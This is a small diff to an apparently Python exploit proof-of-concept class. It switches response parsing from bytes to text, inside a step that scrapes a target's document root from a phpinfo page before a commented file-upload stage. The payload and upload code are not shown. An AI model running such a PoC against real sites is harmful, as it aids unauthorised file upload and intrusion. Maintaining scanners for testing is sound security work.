@@ -53,8 +53,8 @@ class Poc(ABPoc):
             url = self.target + payload
             r = requests.get(url)
             p = re.compile(r'DOCUMENT_ROOT\'\]</td><td class=\"v\">(.+)</td>')
-            if p.findall(r.content):
-                document_root = p.findall(r.content)[0]
+            if p.findall(r.text):
+                document_root = p.findall(r.text)[0]
                 self.output.info('获取到网站绝对路径{}'.format(document_root))
 
             #上传文件
